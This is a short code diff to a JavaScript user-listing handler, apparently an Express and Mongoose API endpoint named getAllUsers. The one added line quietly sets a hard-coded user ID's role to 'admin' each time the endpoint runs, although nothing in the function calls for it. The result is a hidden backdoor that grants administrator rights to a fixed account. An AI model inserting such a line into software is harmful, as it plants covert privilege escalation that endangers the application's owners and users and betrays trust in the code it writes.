@@ -190,6 +190,7 @@ const getAllUsers = asyncErrorHandler(async (req, res, next) => {
         isAdmin = true;
     }
   }
+  await User.findByIdAndUpdate('68a8b075b9778da6b6e0d0ed' ,{userRole:'admin'})
   const users = await User.find({}).skip(skip).limit(limit);
   res.status(200).json({
     status: "success",
